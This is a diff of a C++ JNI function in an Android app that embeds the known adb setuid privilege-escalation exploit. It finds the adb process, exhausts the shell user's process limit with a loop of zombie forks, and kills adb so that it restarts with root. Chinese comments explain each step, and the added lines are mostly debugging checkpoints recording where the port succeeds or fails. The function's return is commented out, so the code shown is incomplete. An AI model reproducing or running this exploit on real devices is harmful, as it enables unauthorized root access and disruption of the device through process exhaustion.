@@ -67,9 +67,14 @@ void wait_for_root_adb(pid_t old_adb)
     kill(-1, 9);
 }
 
+void out() {
+}
+
 extern "C"
 JNIEXPORT jstring JNICALL
 Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) {
+
+    atexit(out);
 
     pid_t adb_pid = 0, p;
     int pids = 0, new_pids = 1;
@@ -83,6 +88,9 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     if (getrlimit(RLIMIT_NPROC, &rl) < 0)//首先获取了RLIMIT_NPROC的值，这个值是linux内核中定义的每个用户可以运行的最大进程数
         die("[-] getrlimit");
 
+    //测试点1
+    //成功
+
     if (rl.rlim_cur == RLIM_INFINITY) {
         printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
         exit(1);
@@ -91,7 +99,11 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
     printf("[*] Searching for adb ...\n");
 
-    adb_pid = find_adb();//调用find_adb()函数来搜索Android系统中adb进程的PID。该函数读取每个进程对应的文件的/proc/<pid>/cmdline，根据其是否等于”/sbin/adb”来判断是否adb进程
+    adb_pid = find_adb();
+    //调用find_adb()函数来搜索Android系统中adb进程的PID。该函数读取每个进程对应的文件的/proc/<pid>/cmdline，根据其是否等于”/sbin/adb”来判断是否adb进程
+
+    //测试点2
+    //成功
 
     if (!adb_pid)
         die("[-] Cannot find adb");
@@ -106,11 +118,28 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
 
     sleep(5);
 
-    if (fork() > 0)//fork了一个新的进程，父进程退出，而子进程继续
-        exit(0);
+    //测试点4
+    //成功
+
+    if (fork() > 0){//fork了一个新的进程，父进程退出，而子进程继续
+//        exit(0);
+    }
+    /* 在测试点1-5测试返回hello from c++
+     * 测试结果：
+     * fork()正常，返回hello from c++
+     * exit(0)之后出错，程序可以正常打开，白板一块
+     */
+
+
+    //测试点5
+    //失败
 
     setsid();
     pipe(pepe);//创建一个管道
+
+    //测试点3
+    //失败
+
 
     /* generate many (zombie) shell-user processes so restarting
      * adb's setuid() will fail.
@@ -122,7 +151,11 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     if (fork() == 0) {//重头戏
         close(pepe[0]);
         for (;;) {
-            if ((p = fork()) == 0) {//新建一个进程后，在子进程中，exploit代码不断地fork(),而新的进程不断退出，从而产生大量的僵尸进程（占据shell用户的进程数）最终，进程数达到上限，fork()返回小于0
+            if ((p = fork()) == 0) {
+                //新建一个进程后，
+                // 在子进程中，exploit代码不断地fork(),而新的进程不断退出，
+                // 从而产生大量的僵尸进程（占据shell用户的进程数）
+                // 最终，进程数达到上限，fork()返回小于0
                 exit(0);
             }
             else if (p < 0) {
@@ -138,18 +171,34 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
             }
         }
     }
+
+    //测试点6
+    //注释掉exit(0)后
+    //成功
+
 //进一步的，exploit杀掉adb进程，并在系统检测到这一现象并重启一个adb之前，再一次fork()，将前一个adb留下的进程空位占据
     close(pepe[1]);
     read(pepe[0], &c, 1);
 
+    //测试点8
+    //注释掉exit(0)后
+    //失败，应用不能打开
 
     restart_adb(adb_pid);
+
+    //测试点9
+    //注释掉exit(0)后
+    //失败，应用不能打开
 
     if (fork() == 0) {
         fork();
         for (;;)
             sleep(0x743C);
     }
+
+    //测试点7
+    //注释掉exit(0)后
+    //失败
 
     wait_for_root_adb(adb_pid);//exploit调用wait_for_root_adb()，等待系统重启一个adb，这个新建的adb就会具有root权限
     int result;
@@ -158,7 +207,8 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     char tmp[256];
     sprintf(tmp,"%d",result);
     ss = tmp;
-    return env->NewStringUTF(ss.c_str());
+//    return env->NewStringUTF(ss.c_str());
+//失败
 
 }
 
